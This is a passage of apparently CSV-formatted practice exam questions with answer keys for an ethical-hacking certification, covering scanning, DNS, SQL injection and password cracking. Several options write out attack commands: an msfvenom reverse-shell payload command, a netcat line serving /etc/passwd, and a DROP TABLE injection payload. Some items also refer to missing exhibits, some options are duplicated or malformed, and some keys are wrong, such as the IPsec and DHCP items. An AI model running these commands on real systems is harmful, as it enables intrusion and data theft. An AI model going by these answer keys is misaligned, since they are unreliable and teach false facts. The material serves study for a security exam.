"s) or you may contact us at the following address: Media Internet Consultants, Edif. Neptuno, Planta Baja, Ave. Ricardo J. Alfaro, Tumba Muerto, n/a Panama How will you determine if this is Real Anti-Virus or Fake Anti-Virus website?\nA. Look at the website design, if it looks professional then it is a Real Anti-Virus website\nB. Connect to the site using SSL, if you are successful then the website is genuine\nC. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site\nD. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\nE. Download and install Anti-Virus software from this suspicious looking site, your Windows 7 will prompt you and stop the installation if the downloaded file is a malware\n","Answer: C — C. Search using the URL and Anti-Virus product name into Google and lookout for suspicious warnings against this site"
"During the enumeration phase. Lawrence performs banner grabbing to obtain information such as OS details and versions of services running. The service that he enumerated runs directly on TCP port 445. Which of the following services is enumerated by Lawrence in this scenario?\nA. Server Message Block (SMB)\nB. Network File System (NFS)\nC. Remote procedure call (RPC)\nD. Telnet\n","Answer: A — A. Server Message Block (SMB)"
"Ethical backer jane Doe is attempting to crack the password of the head of the it department of ABC company. She Is utilizing a rainbow table and notices upon entering a password that extra characters are added to the password after submitting. What countermeasure is the company using to protect against rainbow tables?\nA. Password key hashing\nB. Password salting\nC. Password hashing\nD. Account lockout\n","Answer: B — B. Password salting"
"An attacker runs netcat tool to transfer a secret file between two hosts. He is worried about information being sniffed on the network. How would the attacker use netcat to encrypt the information before transmitting onto the wire?\nA. Machine A: netcat -l -p -s password 1234 < testfileMachine B: netcat <machine A IP> 1234\nB. Machine A: netcat -l -e magickey -p 1234 < testfileMachine B: netcat <machine A IP> 1234\nC. Machine A: netcat -l -p 1234 < testfile -pw passwordMachine B: netcat <machine A IP> 1234 -pw password\nD. Use cryptcat instead of netcat\n","Answer: D — D. Use cryptcat instead of netcat"
"what is the correct way of using MSFvenom to generate a reverse TCP shellcode for windows?\nA. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f c\nB. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f c\nC. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\nD. msfvenom -p windows/meterpreter/reverse_tcp RHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe\n","Answer: C — C. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.30 LPORT=4444 -f exe > shell.exe"
"jane invites her friends Alice and John over for a LAN party. Alice and John access Jane's wireless network without a password. However. Jane has a long, complex password on her router. What attack has likely occurred?\nA. Wireless sniffing\nB. Piggybacking\nC. Evil twin\nD. Wardriving\n","Answer: C — C. Evil twin"
"Fred is the network administrator for his company. Fred is testing an internal switch. From an external IP address, Fred wants to try and trick this switch into thinking it already has established a session with his computer. How can Fred accomplish this?\nA. Fred can accomplish this by sending an IP packet with the RST/SIN bit and the source address of his computer.\nB. He can send an IP packet with the SYN bit and the source address of his computer.\nC. Fred can send an IP packet with the ACK bit set to zero and the source address of the switch.\nD. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine.\n","Answer: D — D. Fred can send an IP packet to the switch with the ACK bit and the source address of his machine."
"Taylor, a security professional, uses a tool to monitor her company's website, analyze the website's traffic, and track the geographical location of the users visiting the company's website. Which of the following tools did Taylor employ in the above scenario?\nA. WebSite Watcher\nB. web-Stat\nC. Webroot\nD. WAFW00F\n","Answer: B — B. web-Stat"
"An Internet Service Provider (ISP) has a need to authenticate users connecting via analog modems, Digital Subscriber Lines (DSL), wireless data services, and Virtual Private Networks (VPN) over a Frame Relay network. Which AAA protocol is the most likely able to handle this requirement?\nA. TACACS+\nB. DIAMETER\nC. Kerberos\nD. RADIUS\n","Answer: D — D. RADIUS"
"In your cybersecurity class, you are learning about common security risks associated with web servers. One topic that comes up is the risk posed by using default server settings. Why is using default settings ona web - server considered a security risk, and what would be the best initial step to mitigate this risk?\nA. Default settings cause server malfunctions; simplify the settings\nB. Default settings allow unlimited login attempts; setup account lockout\nC. Default settings reveal server software type; change these settings\nD. Default settings enable auto-updates; disable and manually patch\n","Answer: C — C. Default settings reveal server software type; change these settings"
"Attempting an injection attack on a web server based on responses to True/False QUESTION NO:s is called which of the following?\nA. Compound SQLi\nB. Blind SQLi\nC. Classic SQLi\nD. DMS-specific SQLi\n","Answer: B — B. Blind SQLi"
"You're the security manager for a tech company that uses a database to store sensitive customer data. You have implemented countermeasures against SQL injection attacks. Recently, you noticed some suspicious activities and suspect an attacker is using SQL injection techniques. The attacker is believed to use different forms of payloads in his SQL queries. In the case of a successful SQL injection attack, which of the following payloads would have the most significant impact?\nA. ??OR 'T=""1: This payload manipulates the WHERE clause of an SQL statement, allowing the attacker to view unauthorized data\nB. ??OR username LIKE '%: This payload uses the LIKE operator to search for a specific pattern in a column\nC. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss\nD. UNION SELECT NULL, NULL, NULL -- : This payload manipulates the UNION SQL operator, enabling the attacker to retrieve data from different database tables\n","Answer: C — C. OR ??a??='a; DROP TABLE members; --: This payload combines the manipulation of the WHERE clausewith a destructive action, causing data loss"
"What is the least important information when you analyze a public IP address in a security alert?\nA. DNS\nB. Whois\nC. Geolocation\nD. ARP\n","Answer: D — D. ARP"
"What useful information is gathered during a successful Simple Mail Transfer Protocol (SMTP) enumeration?\nA. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists.\nB. Reveals the daily outgoing message limits before mailboxes are locked\nC. The internal command RCPT provides a list of ports open to message traffic.\nD. A list of all mail proxy server addresses used by the targeted host\n","Answer: A — A. The two internal commands VRFY and EXPN provide a confirmation of valid users, email addresses, aliases, and mailing lists."
"Study the following log extract and identify the attack.\nA. Hexcode Attack\nB. Cross Site Scripting\nC. Multiple Domain Traversal Attack\nD. Unicode Directory Traversal Attack\n","Answer: D — D. Unicode Directory Traversal Attack"
"You are analysing traffic on the network with Wireshark. You want to routinely run a cron job which will run the capture against a specific set of IPs - 192.168.8.0/24. What command you would use?\nA. wireshark --fetch ''192.168.8*''\nB. wireshark --capture --local masked 192.168.8.0 ---range 24\nC. tshark -net 192.255.255.255 mask 192.168.8.0\nD. sudo tshark -f''net 192 .68.8.0/24''\n","Answer: D — D. sudo tshark -f''net 192 .68.8.0/24''"
"What does the following command in netcat do? nc -l -u -p55555 < /etc/passwd\nA. logs the incoming connections to /etc/passwd file\nB. loads the /etc/passwd file to the UDP port 55555\nC. grabs the /etc/passwd file when connected to UDP port 55555\nD. deletes the /etc/passwd file when connected to the UDP port 55555\n","Answer: C — C. grabs the /etc/passwd file when connected to UDP port 55555"
"You are programming a buffer overflow exploit and you want to create a NOP sled of 200 bytes in the program exploit.c What is the hexadecimal value of NOP instruction?\nA. 0x60\nB. 0x80\nC. 0x70\nD. 0x90\n","Answer: D — D. 0x90"
"Which of the following is the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?\nA. SOA\nB. biometrics\nC. single sign on\nD. PKI\n","Answer: D — D. PKI"
"What two conditions must a digital signature meet?\nA. Has to be the same number of characters as a physical signature and must be unique.\nB. Has to be unforgeable, and has to be authentic.\nC. Must be unique and have special characters.\nD. Has to be legible and neat.\n","Answer: B — B. Has to be unforgeable, and has to be authentic."
"Which of the following tools can be used to perform a zone transfer?\nA. NSLookup\nB. Finger\nC. Dig\nD. Sam Spade\nE. Host\nF. Netcat\nG. Neotrace\n","Answer: ACDE — A. NSLookup; C. Dig; D. Sam Spade; E. Host"
"One of your team members has asked you to analyze the following SOA record. What is the version? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.) (Choose four.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: A — A. 200303028"
"When discussing passwords, what is considered a brute force attack?\nA. You attempt every single possibility until you exhaust all possible combinations or discover the password\nB. You threaten to use the rubber hose on someone unless they reveal their password\nC. You load a dictionary of words into your cracking program\nD. You create hashes of a large number of words and compare it with the encrypted passwords\nE. You wait until the password expires\n","Answer: A — A. You attempt every single possibility until you exhaust all possible combinations or discover the password"
"You are working as a Security Analyst in a company XYZ that owns the whole subnet range of 23.0.0.0/8 and 192.168.0.0/8. While monitoring the data, you find a high number of outbound connections. You see that IP’s owned by XYZ (Internal) and private IP’s are communicating to a Single Public IP. Therefore, the Internal IP’s are sending data to the Public IP. After further analysis, you find out that this Public IP is a blacklisted IP, and the internal communicating devices are compromised. What kind of attack does the above scenario depict?\nA. Botnet Attack\nB. Spear Phishing Attack\nC. Advanced Persistent Threats\nD. Rootkit Attack\n","Answer: A — A. Botnet Attack"
"Joseph was the Web site administrator for the Mason Insurance in New York, who's main Web site was located at www.masonins.com. Joseph uses his laptop computer regularly to administer the Web site. One night, Joseph received an urgent phone call from his friend, Smith. According to Smith, the main Mason Insurance web site had been vandalized! All of its normal content was removed and replaced with an attacker's message ''Hacker Message: You are dead! Freaks!” From his office, which was directly connected to Mason Insurance's internal network, Joseph surfed to the Web site using his laptop. In his browser, the Web site looked completely intact. No changes were apparent. Joseph called a friend of his at his home to help troubleshoot the problem. The Web site appeared defaced when his friend visited using his DSL connection. So, while Smith and his friend could see the defaced page, Joseph saw the intact Mason Insurance web site. To help make sense of this problem, Joseph decided to access the Web site using hisdial-up ISP. He disconnected his laptop from the corporate internal network and used his modem to dial up the same ISP used by Smith. After his modem connected, he quickly typed www.masonins.com in his browser to reveal the following web page: After seeing the defaced Web site, he disconnected his dial-up line, reconnected to the internal network, and used Secure Shell (SSH) to log in directly to the Web server. He ran Tripwire against the entire Web site, and determined that every system file and all the Web content on the server were intact. How did the attacker accomplish this hack?\nA. ARP spoofing\nB. SQL injection\nC. DNS poisoning\nD. Routing table injection\n","Answer: C — C. DNS poisoning"
"Which of the following algorithms can be used to guarantee the integrity of messages being sent, in transit, or stored?\nA. symmetric algorithms\nB. asymmetric algorithms\nC. hashing algorithms\nD. integrity algorithms\n","Answer: C — C. hashing algorithms"
"In the field of cryptanalysis, what is meant by a “rubber-hose” attack?\nA. Forcing the targeted keystream through a hardware-accelerated device such as an ASIC.\nB. A backdoor placed into a cryptographic algorithm by its creator.\nC. Extraction of cryptographic secrets through coercion or torture.\nD. Attempting to decrypt ciphertext by making logical assumptions about the contents of the original plaintext.\n","Answer: C — C. Extraction of cryptographic secrets through coercion or torture."
"In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account's confidential files and information. How can he achieve this?\nA. Privilege Escalation\nB. Shoulder-Surfing\nC. Hacking Active Directory\nD. Port Scanning\n","Answer: A — A. Privilege Escalation"
"Which DNS resource record can indicate how long any ""DNS poisoning"" could last?\nA. MX\nB. SOA\nC. NS\nD. TIMEOUT\n","Answer: B — B. SOA"
"Based on the following extract from the log of a compromised machine, what is the hacker really trying to steal?\nA. har.txt\nB. SAM file\nC. wwwroot\nD. Repair file\n","Answer: B — B. SAM file"
"You are tasked to configure the DHCP server to lease the last 100 usable IP addresses in subnet to. 1.4.0/23. Which of the following IP addresses could be teased as a result of the new configuration?\nA. 210.1.55.200\nB. 10.1.4.254\nC. 10..1.5.200\nD. 10.1.4.156\n","Answer: C — C. 10..1.5.200"
"Log monitoring tools performing behavioral analysis have alerted several suspicious logins on a Linux server occurring during non-business hours. After further examination of all login activities, it is noticed that none of the logins have occurred during typical work hours. A Linux administrator who is investigating this problem realizes the system time on the Linux server is wrong by more than twelve hours. What protocol used on Linux servers to synchronize the time has stopped working?\nA. Time Keeper\nB. NTP\nC. PPP\nD. OSPP\n","Answer: B — B. NTP"
"Elliot is in the process of exploiting a web application that uses SQL as a back-end database. He’s determined that the application is vulnerable to SQL injection, and has introduced conditional timing delays into injected queries to determine whether they are successful. What type of SQL injection is Elliot most likely performing?\nA. Error-based SQL injection\nB. Blind SQL injection\nC. Union-based SQL injection\nD. NoSQL injection\n","Answer: B — B. Blind SQL injection"
"When a normal TCP connection starts, a destination host receives a SYN (synchronize/start) packet from a source host and sends back a SYN/ACK (synchronize acknowledge). The destination host must then hear an ACK (acknowledge) of the SYN/ACK before the connection is established. This is referred to as the ""TCP three-way handshake."" While waiting for the ACK to the SYN ACK, a connection queue of finite size on the destination host keeps track of connections waiting to be completed. This queue typically empties quickly since the ACK is expected to arrive a few milliseconds after the SYN ACK. How would an attacker exploit this design by launching TCP SYN attack?\nA. Attacker generates TCP SYN packets with random destination addresses towards a victim host\nB. Attacker floods TCP SYN packets with random source addresses towards a victim host\nC. Attacker generates TCP ACK packets with random source addresses towards a victim host\nD. Attacker generates TCP RST packets with random source addresses towards a victim host\n","Answer: B — B. Attacker floods TCP SYN packets with random source addresses towards a victim host"
"Under what conditions does a secondary name server request a zone transfer from a primary name server?\nA. When a primary SOA is higher that a secondary SOA\nB. When a secondary SOA is higher that a primary SOA\nC. When a primary name server has had its service restarted\nD. When a secondary name server has had its service restarted\nE. When the TTL falls to zero\n","Answer: A — A. When a primary SOA is higher that a secondary SOA"
"What tool can crack Windows SMB passwords simply by listening to network traffic?\nA. This is not possible\nB. Netbus\nC. NTFSDOS\nD. L0phtcrack\n","Answer: D — D. L0phtcrack"
"One of your team members has asked you to analyze the following SOA record. What is the TTL? Rutgers.edu.SOA NS1.Rutgers.edu ipad.college.edu (200302028 3600 3600 604800 2400.)\nA. 200303028\nB. 3600\nC. 604800\nD. 2400\nE. 60\nF. 4800\n","Answer: D — D. 2400"
"How can you determine if an LM hash you extracted contains a password that is less than 8 characters long?\nA. There is no way to tell because a hash cannot be reversed\nB. The right most portion of the hash is always the same\nC. The hash always starts with AB923D\nD. The left most portion of the hash is always the same\nE. A portion of the hash will be all 0's\n","Answer: B — B. The right most portion of the hash is always the same"
"You have successfully logged on a Linux system. You want to now cover your trade Your login attempt may be logged on several files located in /var/log. Which file does NOT belongs to the list:\nA. user.log\nB. auth.fesg\nC. wtmp\nD. btmp\n","Answer: C — C. wtmp"
"When analyzing the IDS logs, the system administrator noticed an alert was logged when the external router was accessed from the administrator’s Computer to update the router configuration. What type of an alert is this?\nA. False negative\nB. True negative\nC. True positive\nD. False positive\n","Answer: D — D. False positive"
"If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use?\nA. –r\nB. –F\nC. –P\nD. –sP\n","Answer: B — B. –F"
"ViruXine.W32 virus hides their presence by changing the underlying executable code. This Virus code mutates while keeping the original algorithm intact, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. Here is a section of the Virus code: What is this technique called?\nA. Polymorphic Virus\nB. Metamorphic Virus\nC. Dravidic Virus\nD. Stealth Virus\n","Answer: A — A. Polymorphic Virus"
"Study the snort rule given below: From the options below, choose the exploit against which this rule applies.\nA. WebDav\nB. SQL Slammer\nC. MS Blaster\nD. MyDoom\n","Answer: C — C. MS Blaster"
"“........is an attack type for a rogue Wi-Fi access point that appears to be a legitimate one offered on the premises, but actually has been set up to eavesdrop on wireless communications. It is the wireless version of the phishing scam. An attacker fools wireless users into connecting a laptop or mobile phone to a tainted hot- spot by posing as a legitimate provider. This type of attack may be used to steal the passwords of unsuspecting users by either snooping the communication link or by phishing, which involves setting up a fraudulent web site and luring people there.” Fill in the blank with appropriate choice.\nA. Evil Twin Attack\nB. Sinkhole Attack\nC. Collision Attack\nD. Signal Jamming Attack\n","Answer: A — A. Evil Twin Attack"
"You need a tool that can do network intrusion prevention and intrusion detection, function as a network sniffer, and record network activity, what tool would you most likely select?\nA. Nmap\nB. Cain & Abel\nC. Nessus\nD. Snort\n","Answer: D — D. Snort"
"While performing online banking using a Web browser, a user receives an email that contains a link to an interesting Web site. When the user clicks on the link, another Web browser session starts and displays a video of cats playing a piano. The next business day, the user receives what looks like an email from his bank, indicating that his bank account has been accessed from a foreign country. The email asks the user to call his bank and verify the authorization of a funds transfer that took place. What Web browser-based security vulnerability was exploited to compromise the user?\nA. Clickjacking\nB. Cross-Site Scripting\nC. Cross-Site Request Forgery\nD. Web form input validation\n","Answer: C — C. Cross-Site Request Forgery"
"User A is writing a sensitive email message to user B outside the local network. User A has chosen to use PKI to secure his message and ensure only user B can read the sensitive email. At what layer of the OSI layer does the encryption and decryption of the message take place?\nA. Application\nB. Transport\nC. Session\nD. Presentation\n","Answer: D — D. Presentation"
"A penetration tester is conducting a port scan on a specific host. The tester found several ports opened that were confusing in concluding the Operating System (OS) version installed. Considering that NMAP result below, which of the following is likely to be installed on the target machine by the OS? Starting NMAP 5.21 at 2011-03-15 11:06 NMAP scan report for 172.16.40.65 Host is up (1.00s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http 139/tcp open netbios-ssn 515/tcp open 631/tcp open ipp 9100/tcp open MAC Address: 00:00:48:0D:EE:8\nA. The host is likely a Linux machine.\nB. The host is likely a printer.\nC. The host is likely a router.\nD. The host is likely a Windows machine.\n","Answer: B — B. The host is likely a printer."
"Which type of sniffing technique is generally referred as MiTM attack?\nA. Password Sniffing\nB. ARP Poisoning\nC. Mac Flooding\nD. DHCP Sniffing\n","Answer: B — B. ARP Poisoning"
"Bob, a network administrator at BigUniversity, realized that some students are connecting their notebooks in the wired network to have Internet access. In the university campus, there are many Ethernet ports available for professors and authorized visitors but not for students. He identified this when the IDS alerted for malware activities in the network. What should Bob do to avoid this problem?\nA. Disable unused ports in the switches\nB. Separate students in a different VLAN\nC. Use the 802.1x protocol\nD. Ask students to use the wireless network\n","Answer: C — C. Use the 802.1x protocol"
"A zone file consists of which of the following Resource Records (RRs)?\nA. DNS, NS, AXFR, and MX records\nB. DNS, NS, PTR, and MX records\nC. SOA, NS, AXFR, and MX records\nD. SOA, NS, A, and MX records\n","Answer: D — D. SOA, NS, A, and MX records"
"Which system consists of a publicly available set of databases that contain domain name registration contact information?\nA. WHOIS\nB. CAPTCHA\nC. IANA\nD. IETF\n","Answer: A — A. WHOIS"
"During an Xmas scan what indicates a port is closed?\nA. No return response\nB. RST\nC. ACK\nD. SYN\n","Answer: B — B. RST"
"Every company needs a formal written document which spells out to employees precisely what they are allowed to use the company's systems for, what is prohibited, and what will happen to them if they break the rules. Two printed copies of the policy should be given to every employee as soon as possible after they join the organization. The employee should be asked to sign one copy, which should be safely filed by the company. No one should be allowed to use the company's computer systems until they have signed the policy in acceptance of its terms. What is this document called?\nA. Information Audit Policy (IAP)\nB. Information Security Policy (ISP)\nC. Penetration Testing Policy (PTP)\nD. Company Compliance Policy (CCP)\n","Answer: B — B. Information Security Policy (ISP)"
"Eve is spending her day scanning the library computers. She notices that Alice is using a computer whose port 445 is active and listening. Eve uses the ENUM tool to enumerate Alice machine. From the command prompt, she types the following command. What is Eve trying to do?\nA. Eve is trying to connect as a user with Administrator privileges\nB. Eve is trying to enumerate all users with Administrative privileges\nC. Eve is trying to carry out a password crack for user Administrator\nD. Eve is trying to escalate privilege of the null user to that of Administrator\n","Answer: C — C. Eve is trying to carry out a password crack for user Administrator"
"Bob is going to perform an active session hijack against Brownies Inc. He has found a target that allows session oriented connections (Telnet) and performs the sequence prediction on the target operating system. He manages to find an active session due to the high level of traffic on the network. What is Bob supposed to do next?\nA. Take over the session\nB. Reverse sequence prediction\nC. Guess the sequence numbers\nD. Take one of the parties offline\n","Answer: C — C. Guess the sequence numbers"
"The network team has well-established procedures to follow for creating new rules on the firewall. This includes having approval from a manager prior to implementing any new rules. While reviewing the firewall configuration, you notice a recently implemented rule but cannot locate manager approval for it. What would be a good step to have in the procedures for a situation like this?\nA. Have the network team document the reason why the rule was implemented without prior manager approval.\nB. Monitor all traffic using the firewall rule until a manager can approve it.\nC. Do not roll back the firewall rule as the business may be relying upon it, but try to get manager approval as soon as possible.\nD. Immediately roll back the firewall rule until a manager can approve it\n","Answer: D — D. Immediately roll back the firewall rule until a manager can approve it"
"Bob, a system administrator at TPNQM SA, concluded one day that a DMZ is not needed if he properly configures the firewall to allow access just to servers/ports, which can have direct internet access, and block the access to workstations. Bob also concluded that DMZ makes sense just when a stateful firewall is available, which is not the case of TPNQM SA. In this context, what can you say?\nA. Bob can be right since DMZ does not make sense when combined with stateless firewalls\nB. Bob is partially righ\nC. He does not need to separate networks if he can create rules by destination IPs, one by one\nD. Bob is totally wron\nE. DMZ is always relevant when the company has internet servers and workstations\nF. Bob is partially righ\nG. DMZ does not make sense when a stateless firewall is available\n","Answer: C — C. He does not need to separate networks if he can create rules by destination IPs, one by one"
"As a Certified Ethical Hacker, you were contracted by a private firm to conduct an external security assessment through penetration testing. What document describes the specifics of the testing, the associated violations, and essentially protects both the organization’s interest and your liabilities as a tester?\nA. Service Level Agreement\nB. Project Scope\nC. Rules of Engagement\nD. Non-Disclosure Agreement\n","Answer: C — C. Rules of Engagement"
"A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?\nA. The computer is not using a private IP address.\nB. The gateway is not routing to a public IP address.\nC. The gateway and the computer are not on the same network.\nD. The computer is using an invalid IP address.\n","Answer: B — B. The gateway is not routing to a public IP address."
"To determine if a software program properly handles a wide range of invalid input, a form of automated testing can be used to randomly generate invalid input in an attempt to crash the program. What term is commonly used when referring to this type of testing?\nA. Randomizing\nB. Bounding\nC. Mutating\nD. Fuzzing\n","Answer: D — D. Fuzzing"
"In the context of Windows Security, what is a 'null' user?\nA. A user that has no skills\nB. An account that has been suspended by the admin\nC. A pseudo account that has no username and password\nD. A pseudo account that was created for security administration purpose\n","Answer: C — C. A pseudo account that has no username and password"
"An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections. When users accessed any page, the applet ran and exploited many machines. Which one of the following tools the hacker probably used to inject HTML code?\nA. Wireshark\nB. Ettercap\nC. Aircrack-ng\nD. Tcpdump\n","Answer: B — B. Ettercap"
"Matthew, a black hat, has managed to open a meterpreter session to one of the kiosk machines in Evil Corp’s lobby. He checks his current SID, which is S-1-5-21-1223352397-1872883824-861252104-501. What needs to happen before Matthew has full administrator access?\nA. He must perform privilege escalation.\nB. He needs to disable antivirus protection.\nC. He needs to gain physical access.\nD. He already has admin privileges, as shown by the “501” at the end of the SID.\n","Answer: A — A. He must perform privilege escalation."
"Eric has discovered a fantastic package of tools named Dsniff on the Internet. He has learnt to use these tools in his lab and is now ready for real world exploitation. He was able to effectively intercept communications between the two entities and establish credentials with both sides of the connections. The two remote ends of the communication never notice that Eric is relaying the information between the two. What would you call this attack?\nA. Interceptor\nB. Man-in-the-middle\nC. ARP Proxy\nD. Poisoning Attack\n","Answer: B — B. Man-in-the-middle"
"CompanyXYZ has asked you to assess the security of their perimeter email gateway. From your office in New York, you craft a specially formatted email message and send it across the Internet to an employee of CompanyXYZ. The employee of CompanyXYZ is aware of your test. Your email message looks like this: From: jim_miller@companyxyz.com To: michelle_saunders@companyxyz.com Subject: Test message Date: 4/3/2017 14:37 The employee of CompanyXYZ receives your email message. This proves that CompanyXYZ’s email gateway doesn’t prevent what?\nA. Email Masquerading\nB. Email Harvesting\nC. Email Phishing\nD. Email Spoofing\n","Answer: D — D. Email Spoofing"
"This TCP flag instructs the sending system to transmit all buffered data immediately.\nA. SYN\nB. RST\nC. PSH\nD. URG\nE. FIN\n","Answer: C — C. PSH"
"Peter extracts the SIDs list from Windows 2000 Server machine using the hacking tool ""SIDExtractor"". Here is the output of the SIDs: From the above list identify the user account with System Administrator privileges.\nA. John\nB. Rebecca\nC. Sheela\nD. Shawn\nE. Somia\nF. Chang\nG. Micah\n","Answer: F — F. Chang"
"Although FTP traffic is not encrypted by default, which layer 3 protocol would allow for end-to-end encryption of the connection?\nA. SFTP\nB. Ipsec\nC. SSL\nD. FTPS\n","Answer: B — B. Ipsec"
"Switches maintain a CAM Table that maps individual MAC addresses on the network to physical ports on the switch. In MAC flooding attack, a switch is fed with many Ethernet frames, each containing different source MAC addresses, by the attacker. Switches have a limited memory for mapping various MAC addresses to physical ports. What happens when the CAM table becomes full?\nA. Switch then acts as hub by broadcasting packets to all machines on the network\nB. The CAM overflow table will cause the switch to crash causing Denial of Service\nC. The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF\nD. Every packet is dropped and the switch sends out SNMP alerts to the IDS port\n","Answer: A — A. Switch then acts as hub by broadcasting packets to all machines on the network"
"What is the known plaintext attack used against DES which gives the result that encrypting plaintext with one DES key followed by encrypting it with a second DES key is no more secure than using a single key?\nA. Man-in-the-middle attack\nB. Meet-in-the-middle attack\nC. Replay attack\nD. Traffic analysis attack\n","Answer: B — B. Meet-in-the-middle attack"
"Some clients of TPNQM SA were redirected to a malicious site when they tried to access the TPNQM main site. Bob, a system administrator at TPNQM SA, found that they were victims of DNS Cache Poisoning. What should Bob recommend to deal with such a threat?\nA. The use of security agents in clients’ computers\nB. The use of DNSSEC\nC. The use of double-factor authentication\nD. Client awareness\n","Answer: B — B. The use of DNSSEC"
"Why would you consider sending an email to an address that you know does not exist within the company you are performing a Penetration Test for?\nA. To determine who is the holder of the root account\nB. To perform a DoS\nC. To create needless SPAM\nD. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail\nE. To test for virus protection\n","Answer: D — D. To illicit a response back that will reveal information about email servers and how they treat undeliverable mail"
"You have the SOA presented below in your Zone. Your secondary servers have not been able to contact your primary server to synchronize information. How long will the secondary servers attempt to contact the primary server before it considers that zone is dead and stops responding to queries? collegae.edu.SOA, cikkye.edu ipad.college.edu. (200302028 3600 3600 604800 3600)\nA. One day\nB. One hour\nC. One week\nD. One month\n","Answer: C — C. One week"
"You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you come to know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least 8 characters in length. All passwords must also use 3 of the 4 following categories: lower case letters, capital letters, numbers and special characters. With your existing knowledge of users, likely user account names and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values and still get results?\nA. Online Attack\nB. Dictionary Attack\nC. Brute Force Attack\nD. Hybrid Attack\n","Answer: D — D. Hybrid Attack"
"Take a look at the following attack on a Web Server using obstructed URL: How would you protect from these attacks?\nA. Configure the Web Server to deny requests involving ""hex encoded"" characters\nB. Create rules in IDS to alert on strange Unicode requests\nC. Use SSL authentication on Web Servers\nD. Enable Active Scripts Detection at the firewall and routers\n","Answer: B — B. Create rules in IDS to alert on strange Unicode requests"
"Which results will be returned with the following Google search query? site:target.com – site:Marketing.target.com accounting\nA. Results from matches on the site marketing.target.com that are in the domain target.com but do not include the word accounting.\nB. Results matching all words in the query.\nC. Results for matches on target.com and Marketing.target.com that include the word “accounting”\nD. Results matching “accounting” in domain target.com but not on the site Marketing.target.com\n","Answer: D — D. Results matching “accounting” in domain target.com but not on the site Marketing.target.com"
"Why should the security analyst disable/remove unnecessary ISAPI filters?\nA. To defend against social engineering attacks\nB. To defend against webserver attacks\nC. To defend against jailbreaking\nD. To defend against wireless attacks\n","Answer: B — B. To defend against webserver attacks"
"What is the way to decide how a packet will move from an untrusted outside host to a protected inside that is behind a firewall, which permits the hacker to determine which ports are open and if the packets can pass through the packet-filtering of the firewall?\nA. Session hijacking\nB. Firewalking\nC. Man-in-the middle attack\nD. Network sniffing\n","Answer: B — B. Firewalking"
"In the context of password security, a simple dictionary attack involves loading a dictionary file (a text file full of dictionary words) into a cracking application such as L0phtCrack or John the Ripper, and running it against user accounts located by the application. The larger the word and word fragment selection, the more effective the dictionary attack is. The brute force method is the most inclusive, although slow. It usually tries every possible letter and number combination in its automated exploration. If you would use both brute force and dictionary methods combined together to have variation of words, what would you call such an attack?\nA. Full Blown\nB. Thorough\nC. Hybrid\nD. BruteDics\n","Answer: C — C. Hybrid"
"Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?\nA. Nikto\nB. John the Ripper\nC. Dsniff\nD. Snort\n","Answer: A — A. Nikto"
"DHCP snooping is a great solution to prevent rogue DHCP servers on your network. Which security feature on switchers leverages the DHCP snooping database to help prevent man-in-the-middle attacks?\nA. Spanning tree\nB. Dynamic ARP Inspection (DAI)\nC. Port security\nD. Layer 2 Attack Prevention Protocol (LAPP)\n","Answer: B — B. Dynamic ARP Inspection (DAI)"
"Internet Protocol Security IPsec is actually a suite pf protocols. Each protocol within the suite provides different functionality. Collective IPsec does everything except.\nA. Protect the payload and the headers\nB. Encrypt\nC. Work at the Data Link Layer\nD. Authenticate\n","Answer: D — D. Authenticate"
"The following is an entry captured by a network IDS. You are assigned the task of analyzing this entry. You notice the value 0x90, which is the most common NOOP instruction for the Intel processor. You figure that the attacker is attempting a buffer overflow attack. You also notice ""/bin/sh"" in the ASCII part of the output. As an analyst what would you conclude about the attack?\nA. The buffer overflow attack has been neutralized by the IDS\nB. The attacker is creating a directory on the compromised machine\nC. The attacker is attempting a buffer overflow attack and has succeeded\nD. The attacker is attempting an exploit that launches a command-line shell\n","Answer: D — D. The attacker is attempting an exploit that launches a command-line shell"
"Steve, a scientist who works in a governmental security agency, developed a technological solution to identify people based on walking patterns and implemented this approach to a physical control access. A camera captures people walking and identifies the individuals using Steve’s approach. After that, people must approximate their RFID badges. Both the identifications are required to open the door. In this case, we can say:\nA. Although the approach has two phases, it actually implements just one authentication factor\nB. The solution implements the two authentication factors: physical object and physical characteristic\nC. The solution will have a high level of false positives\nD. Biological motion cannot be used to identify people\n","Answer: B — B. The solution implements the two authentication factors: physical object and physical characteristic"
